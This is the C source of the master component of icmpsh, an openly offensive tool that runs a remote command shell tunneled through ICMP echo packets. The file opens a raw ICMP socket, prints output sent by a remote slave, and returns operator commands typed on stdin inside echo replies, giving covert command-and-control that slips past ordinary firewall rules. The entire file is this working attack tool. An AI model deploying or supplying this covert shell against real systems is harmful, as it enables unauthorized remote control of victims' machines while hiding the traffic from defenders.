/*
 *   icmpsh - simple icmp command shell
 *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define IN_BUF_SIZE   1024
#define OUT_BUF_SIZE  64

// calculate checksum
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

int main(int argc, char **argv)
{
    int sockfd;
    int flags;
    char in_buf[IN_BUF_SIZE];
    char out_buf[OUT_BUF_SIZE];
    unsigned int out_size;
    int nbytes;
    struct iphdr *ip;
    struct icmphdr *icmp;
    char *data;
    struct sockaddr_in addr;


    printf("icmpsh - master\n");
    
    // create raw ICMP socket
    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == -1) {
       perror("socket");
       return -1;
    }

    // set stdin to non-blocking
    flags = fcntl(0, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(0, F_SETFL, flags);

    printf("running...\n");
    while(1) {

        // read data from socket
        memset(in_buf, 0x00, IN_BUF_SIZE);
        nbytes = read(sockfd, in_buf, IN_BUF_SIZE - 1);
        if (nbytes > 0) {
            // get ip and icmp header and data part
            ip = (struct iphdr *) in_buf;
            if (nbytes > sizeof(struct iphdr)) {
                nbytes -= sizeof(struct iphdr);
                icmp = (struct icmphdr *) (ip + 1);
                if (nbytes > sizeof(struct icmphdr)) {
                    nbytes -= sizeof(struct icmphdr);
                    data = (char *) (icmp + 1);
                    data[nbytes] = '\0';
                    printf("%s", data);
                    fflush(stdout);
                }
                
                // reuse headers
                icmp->type = 0;
                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = ip->saddr;
        
                // read data from stdin
                nbytes = read(0, out_buf, OUT_BUF_SIZE);
                if (nbytes > -1) {
                    memcpy((char *) (icmp + 1), out_buf, nbytes);
                    out_size = nbytes;
                } else {
                    out_size = 0;
                }

                icmp->checksum = 0x00;
                icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + out_size);

                // send reply
                nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + out_size, 0, (struct sockaddr *) &addr, sizeof(addr));
                if (nbytes == -1) {
                    perror("sendto");
                    return -1;
                }        
            }
        }
    }

    return 0;
}

